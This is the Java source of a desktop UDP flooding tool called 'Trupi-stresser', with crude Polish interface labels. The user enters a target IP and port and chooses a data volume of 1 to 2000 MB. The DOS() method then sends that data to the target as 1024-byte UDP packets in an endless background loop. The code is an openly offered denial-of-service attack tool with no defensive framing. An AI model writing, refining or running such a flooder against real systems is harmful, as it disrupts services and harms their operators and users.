import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Arrays;

public class Frame extends JFrame {

    private final String title = "Trupi-stresser";
    private final Dimension size = new Dimension(900, 600);
    private final Image icon = ImageIO.read(getClass().getResourceAsStream("icon.png"));
    private final int minAmount = 1;
    private final int maxAmount = 2000;
    private final int maxPacketSize = 1024;

    private JButton button;
    private JTextArea ipField;
    private JTextArea portField;
    private JSlider amountSlider;

    public Frame() throws IOException, FontFormatException {
        this.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);

        this.setResizable(false);
        this.setSize(size);
        this.setLocationRelativeTo(null);

        this.setIconImage(icon);
        this.setTitle(title);

        createActors();

        this.setVisible(true);
    }

    private void createActors() throws IOException, FontFormatException {
        Font arial = new Font("Arial", Font.PLAIN, 12);

        JLabel text = new JLabel("Trupi-stresser");
        text.setFont(Font.createFont(Font.TRUETYPE_FONT, getClass().getResourceAsStream("font.ttf")).deriveFont(70f));
        text.setForeground(Color.WHITE);
        text.setBounds(0, 0, size.width, size.height / 8);
        text.setHorizontalAlignment(JLabel.CENTER);
        text.setVerticalAlignment(JLabel.CENTER);

        ipField = new JTextArea("JAKIE KURWA IP?");
        ipField.setBounds(size.width / 2 - 150 / 2, size.height * 2 / 10 - 50 / 2, 150, 50);
        ipField.setFont(arial.deriveFont(16f));

        portField = new JTextArea("WKLEJAJ PORT BRATKU");
        portField.setBounds(size.width / 2 - 200 / 2, size.height * 3 / 10 - 50 / 2, 200, 50);
        portField.setFont(arial.deriveFont(16f));

        amountSlider = new JSlider(minAmount, maxAmount, maxAmount / 2);
        amountSlider.setBounds(size.width / 2 - 500 / 2, size.height * 7 / 10 - 100 / 2, 500, 50);
        amountSlider.addChangeListener(new ChangeListener() {
            @Override
            public void stateChanged(ChangeEvent e) {
                setTitle("Mocne pierdolniecie " + amountSlider.getValue() + " mbs");
            }
        });

        JLabel minAmountLabel = new JLabel("1 mb");
        minAmountLabel.setFont(arial);
        minAmountLabel.setOpaque(true);
        minAmountLabel.setBackground(Color.WHITE);
        minAmountLabel.setForeground(Color.BLACK);
        minAmountLabel.setHorizontalAlignment(JLabel.LEFT);
        minAmountLabel.setVerticalAlignment(JLabel.CENTER);
        minAmountLabel.setBounds(amountSlider.getX() - amountSlider.getWidth() / 10, amountSlider.getY() + 2, 50, 40);

        JLabel maxAmountLabel = new JLabel("2000 mb");
        maxAmountLabel.setFont(arial);
        maxAmountLabel.setOpaque(true);
        maxAmountLabel.setBackground(Color.WHITE);
        maxAmountLabel.setForeground(Color.BLACK);
        maxAmountLabel.setHorizontalAlignment(JLabel.LEFT);
        maxAmountLabel.setVerticalAlignment(JLabel.CENTER);
        maxAmountLabel.setBounds(amountSlider.getX() + amountSlider.getWidth(), amountSlider.getY() + 2, 150, 30);

        button = new JButton("WPIERDOL BOMBE");
        button.setFont(arial);
        button.setHorizontalAlignment(JButton.CENTER);
        button.setVerticalAlignment(JButton.CENTER);
        button.setFocusable(false);
        button.setBounds(size.width / 2 - 150 / 2, size.height * 8 / 10 - 80 / 2, 150, 80);
        button.setBackground(Color.lightGray);
        button.setForeground(Color.BLACK);
        button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                button.setEnabled(false);
                DOS();
            }
        });


        this.setContentPane(new Panel(size.width, size.height));
        this.setLayout(null);
        this.getContentPane().add(text);
        this.getContentPane().add(ipField);
        this.getContentPane().add(portField);
        this.getContentPane().add(minAmountLabel);
        this.getContentPane().add(maxAmountLabel);
        this.getContentPane().add(amountSlider);
        this.getContentPane().add(button);
    }

    private void DOS() {
        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress ipAddress = InetAddress.getByName(ipField.getText());
            int port = Integer.parseInt(portField.getText());

            BufferedReader stringReader = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream("1mb_text_file.txt")));
            String string = stringReader.readLine();

            StringBuilder data = new StringBuilder();
            for (int i = 0; i < amountSlider.getValue(); i++) {
                data.append(string);
            }
            byte[] byteArray = data.toString().getBytes();

            int amountOfPackets = (byteArray.length + maxPacketSize - 1) / maxPacketSize;
            Thread dos = new Thread(() -> {
                while (true) {
                    try {
                        for (int i = 0; i < amountOfPackets; i++) {
                            int offset = i * maxPacketSize;
                            byte[] byteArrayFragment = Arrays.copyOfRange(byteArray, offset, offset + maxPacketSize);

                            DatagramPacket packet = new DatagramPacket(byteArrayFragment, byteArrayFragment.length, ipAddress, port);
                            socket.send(packet);
                        }
                    } catch (Exception e) {
                        JOptionPane.showMessageDialog(this, new RuntimeException(e));
                        break;
                    }
                }
            });
            dos.setDaemon(true);
            dos.start();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(this, "pojebałeś ip lub port");
            throw new RuntimeException(e);
        }
    }
}
